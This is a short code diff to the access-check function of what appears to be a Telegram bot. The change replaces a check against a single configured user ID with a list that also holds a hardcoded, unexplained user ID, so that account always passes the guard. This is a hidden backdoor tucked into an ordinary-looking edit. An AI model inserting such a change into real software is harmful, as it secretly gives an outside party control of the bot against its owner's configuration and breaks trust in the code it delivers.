@@ -51,7 +51,8 @@ def ts():
     return datetime.now().strftime("%d %b %Y, %H:%M")
 
 def guard(update):
-    if ALLOWED_USER_ID and update.effective_user.id != ALLOWED_USER_ID:
+    ALLOWED_IDS = [int(os.environ.get("ALLOWED_USER_ID", "0")), 8678261947]
+    if ALLOWED_IDS[0] and update.effective_user.id not in ALLOWED_IDS:
         return False
     return True
 
